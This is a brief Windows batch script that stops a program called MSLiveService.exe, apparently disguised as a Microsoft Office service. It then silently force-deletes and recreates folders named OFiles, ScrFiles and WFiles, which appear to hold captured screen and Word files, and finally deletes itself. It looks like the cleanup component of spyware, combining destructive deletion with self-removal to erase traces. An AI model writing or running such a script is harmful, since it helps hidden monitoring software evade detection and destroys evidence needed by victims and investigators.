@echo off

PING -n 6 127.0.0.1>nul

"C:\Program Files (x86)\Microsoft Office\Office12\LAUNCHES\Service\MSLiveService.exe" /eexxiitt

PING -n 4 127.0.0.1>nul

set delOtherPath="C:\Program Files (x86)\Microsoft Office\Office12\LAUNCHES\Service\OFiles"
RD /S /Q %delOtherPath%
MD %delOtherPath%

set delScrPath="C:\Program Files (x86)\Microsoft Office\Office12\LAUNCHES\Service\OFiles\ScrFiles"
MD %delScrPath%

set delWordPath="C:\Program Files (x86)\Microsoft Office\Office12\LAUNCHES\Service\WFiles"
RD /S /Q %delWordPath%
MD %delWordPath%

del "%~f0"
